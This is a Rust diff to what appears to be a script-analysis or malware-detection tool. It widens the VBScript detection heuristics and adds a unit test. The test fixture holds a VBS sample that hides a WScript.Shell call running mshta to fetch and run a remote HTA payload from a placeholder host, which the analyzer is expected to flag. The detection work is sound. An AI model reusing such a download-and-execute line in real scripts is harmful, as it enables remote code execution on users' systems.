@@ -2888,6 +2888,12 @@ fn looks_like_vbs_script(lower: &str) -> bool {
         || lower.starts_with("dim ")
         || lower.contains("\nsub ")
         || lower.starts_with("sub ")
+        || lower.contains("\npublic sub ")
+        || lower.starts_with("public sub ")
+        || lower.contains("\nprivate sub ")
+        || lower.starts_with("private sub ")
+        || lower.contains("\npublic function ")
+        || lower.starts_with("public function ")
 }
 
 fn looks_like_js_script(lower: &str) -> bool {
@@ -2923,6 +2929,9 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || first.starts_with("private function")
         || first.starts_with("on error ")
         || first.starts_with("sub ")
+        || first.starts_with("public sub ")
+        || first.starts_with("private sub ")
+        || first.starts_with("public function ")
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
@@ -14232,6 +14241,32 @@ Main"#;
         );
         assert!(
             report.deobfuscated.contains("Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_public_sub_prefix_shell_run_url_extracted() {
+        let vbs = br#"Public Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-public-sub.example/payload.hta", 0, False
+End Sub
+Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-public-sub.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Public Sub prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Public Sub Main()\nSet sh"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
